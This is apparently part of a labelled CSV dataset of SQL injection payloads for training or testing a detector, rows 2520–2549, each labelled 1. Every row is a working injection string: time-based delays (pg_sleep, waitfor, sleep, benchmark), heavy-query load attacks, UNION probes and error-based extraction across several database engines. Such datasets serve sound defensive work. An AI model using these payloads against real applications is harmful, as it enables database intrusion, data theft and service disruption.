row_index,payload_norm,label,sqli_type_hint
2520,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'ozef' = 'ozef",1,
2521,"1"" ) as zovk where 4591 = 4591 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
2522,"1"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""wvlb"" like ""wvlb",1,
2523,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",1,
2524,"1'+ ( select oqvo where 7448 = 7448 union all select null,null,null,null,null--",1,
2525,-3084%' ) ) order by 1--,1,
2526,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'adsh' = 'adsh",1,
2527,"1 ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 4348 = 4348",1,
2528,1' ) ) as iuta where 1482 = 1482,1,
2529,"1"" ) ) ) waitfor delay '0:0:5'--",1,
2530,"1 ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
2531,"1' in boolean mode ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) #",1,
2532,"1 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
2533,"1' ) ) as prxm where 1267 = 1267 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2534,"1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'gcna' = 'gcna",1,
2535,1' ) ) order by 1#,1,
2536,"end and ( ( ( ""zpii"" like ""zpii",1,
2537,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'fuvv' = 'fuvv,1,
2538,select ( case when ( 5970 = 2200 ) then 1 else 5970* ( select 5970 from master..sysdatabases ) end ) --,1,
2539,"-4756%' ) ) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",1,
2540,"1"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
2541,"1%"" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
2542,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'iqvg' = 'iqvg",1,
2543,"1%"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
2544,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,
2545,"iif ( 1539 = 1539,1539,1/0 )",1,
2546,"1 ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 8738 = 8738",1,
2547,1'+ ( select 'xqjx' where 7048 = 7048 and 9198 = 9198--,1,
2548,1'|| ( select 'feki' where 4082 = 4082 and ( 3587 = 4207 ) *4207 ) ||',1,
2549,"1"" ) as jiiq where 6847 = 6847",1,
